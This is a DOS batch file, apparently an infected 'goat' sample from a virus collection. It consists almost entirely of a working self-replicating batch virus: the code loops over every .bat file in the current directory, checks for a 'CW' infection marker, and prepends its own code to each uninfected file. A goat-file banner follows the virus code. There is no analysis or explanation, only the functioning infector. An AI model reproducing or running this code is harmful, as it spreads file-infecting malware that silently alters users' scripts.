@echo off%CW%
if '%1' == '' goto b
find "CW" <%1 >nul
if not errorlevel 1 goto c
if exist %0.bat goto a
ren %1 vir.tmp
type %0 >%1
type vir.tmp >>%1
del vir.tmp
goto c
:a
ren %1 vir.tmp
type %0.bat >%1
type vir.tmp >>%1
del vir.tmp
goto c
:b
for %%a in (*.bat) do call %0 %%a
:c
@echo off
echo ***********************************
echo * Goat bat file. Size = 137 bytes *
echo ***********************************
